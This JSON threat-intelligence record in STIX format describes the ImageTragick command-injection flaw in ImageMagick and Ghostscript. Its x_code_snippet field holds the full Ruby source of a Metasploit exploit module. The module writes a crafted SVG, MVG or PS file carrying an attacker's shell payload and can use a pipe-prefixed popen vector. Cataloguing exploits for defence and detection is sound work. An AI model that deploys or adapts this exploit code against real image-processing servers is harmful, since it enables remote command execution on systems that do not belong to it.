{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e64981ee-a8aa-4b1f-a7a1-d8a95c4142d1",
    "created": "2024-08-14T17:14:07.152839Z",
    "modified": "2024-08-14T17:14:07.152844Z",
    "name": "ImageMagick Delegate Arbitrary Command Execution",
    "description": " This module exploits a shell command injection in the way \"delegates\" (commands for converting files) are processed in ImageMagick versions <= 7.0.1-0 and <= 6.9.3-9 (legacy).  Since ImageMagick uses file magic to detect file format, you can create a .png (for example) which is actually a crafted SVG (for example) that triggers the command injection.  The PostScript (PS) target leverages a Ghostscript -dSAFER bypass (discovered by taviso) to achieve RCE in the Ghostscript delegate. Ghostscript versions 9.18 and later are affected. This target is provided as is and will not be updated to track additional vulns.  If USE_POPEN is set to true, a |-prefixed command will be used for the exploit. No delegates are involved in this exploitation. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/fileformat/imagemagick_delegate.rb",
            "external_id": "imagemagick_delegate.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'             => 'ImageMagick Delegate Arbitrary Command Execution',\n      'Description'      => %q{\n        This module exploits a shell command injection in the way \"delegates\"\n        (commands for converting files) are processed in ImageMagick versions\n        <= 7.0.1-0 and <= 6.9.3-9 (legacy).\n\n        Since ImageMagick uses file magic to detect file format, you can create\n        a .png (for example) which is actually a crafted SVG (for example) that\n        triggers the command injection.\n\n        The PostScript (PS) target leverages a Ghostscript -dSAFER bypass\n        (discovered by taviso) to achieve RCE in the Ghostscript delegate.\n        Ghostscript versions 9.18 and later are affected. This target is\n        provided as is and will not be updated to track additional vulns.\n\n        If USE_POPEN is set to true, a |-prefixed command will be used for the\n        exploit. No delegates are involved in this exploitation.\n      },\n      'Author'           => [\n        'stewie',            # Vulnerability discovery\n        'Nikolay Ermishkin', # Vulnerability discovery\n        'Tavis Ormandy',     # Vulnerability discovery\n        'wvu',               # Metasploit module\n        'hdm'                # Metasploit module\n      ],\n      'References'       => [\n        %w{CVE 2016-3714},\n        %w{CVE 2016-7976},\n        %w{URL https://imagetragick.com/},\n        %w{URL https://seclists.org/oss-sec/2016/q2/205},\n        %w{URL https://seclists.org/oss-sec/2016/q3/682},\n        %w{URL https://github.com/ImageMagick/ImageMagick/commit/06c41ab},\n        %w{URL https://github.com/ImageMagick/ImageMagick/commit/a347456},\n        %w{URL http://permalink.gmane.org/gmane.comp.security.oss.general/19669}\n      ],\n      'DisclosureDate'   => '2016-05-03',\n      'License'          => MSF_LICENSE,\n      'Platform'         => 'unix',\n      'Arch'             => ARCH_CMD,\n      'Privileged'       => false,\n      'Payload'          => {\n        'BadChars'       => \"\\x22\\x27\\x5c\" # \", ', and \\\n      },\n      'Targets'          => [\n        ['SVG file', template: 'msf.svg'], # convert msf.png msf.svg\n        ['MVG file', template: 'msf.mvg'], # convert msf.svg msf.mvg\n        ['PS file',  template: 'msf.ps']   # PoC from taviso\n      ],\n      'DefaultTarget'    => 0,\n      'Notes'            => {\n        'Stability' => [CRASH_SAFE],\n        'SideEffects' => [],\n        'Reliability' => [],\n        'AKA' => ['ImageTragick'],\n        'RelatedModules' => [\n          'exploit/unix/fileformat/ghostscript_type_confusion',\n          'exploit/multi/fileformat/ghostscript_failed_restore'\n        ]\n      }\n    ))\n\n    register_options([\n      OptString.new('FILENAME', [true, 'Output file', 'msf.png']),\n      OptBool.new('USE_POPEN',  [false, 'Use popen() vector', true])\n    ])\n  end\n\n  def exploit\n    if target.name == 'SVG file'\n      p = Rex::Text.html_encode(payload.encoded)\n    else\n      p = payload.encoded\n    end\n\n    file_create(template.sub('echo vulnerable > /dev/tty', p))\n  end\n\n  def template\n    if datastore['USE_POPEN']\n      t = 'popen'\n    else\n      t = 'delegate'\n    end\n\n    begin\n      File.read(File.join(\n        Msf::Config.data_directory, 'exploits', 'imagemagick', t,\n        target[:template]\n      ))\n    rescue Errno::ENOENT\n      fail_with(Failure::NoTarget, \"Target has no #{t} support\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-05-03",
    "x_mitre_platforms": [
        "unix'"
    ]
}